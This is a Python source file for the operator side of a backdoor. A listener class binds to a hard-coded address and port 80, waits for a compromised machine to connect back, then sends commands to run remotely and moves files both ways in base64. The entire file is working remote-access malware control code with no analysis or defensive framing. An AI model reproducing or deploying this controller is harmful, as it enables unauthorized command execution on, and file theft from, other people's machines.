import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = server.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1536 * 1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotly(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:                   
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                elif command[0] == 'cd' and len(command) > 2:
                    command[1] = " ".join(command[1:])
                result = self.execute_remotly(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)



my_listener = Listener("192.168.18.5", 80)
my_listener.run()
